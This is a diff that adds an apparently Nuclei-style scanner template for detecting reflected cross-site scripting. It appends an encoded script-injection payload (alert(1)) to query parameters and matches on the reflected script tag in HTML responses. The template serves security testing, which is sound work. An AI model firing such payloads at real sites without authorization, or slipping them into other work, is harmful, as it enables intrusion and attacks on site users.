@@ -1,0 +1,36 @@
+id: html-xss
+
+info:
+  name: Reflected Cross Site Scripting
+  author: reewardius
+  severity: medium
+  tags: fuzzing-xss,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      xss:
+        - "&#39;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//"
+        
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: multiple
+        fuzz:
+          - "{{xss}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          
+      - type: word
+        part: header
+        words:
+          - "text/html"
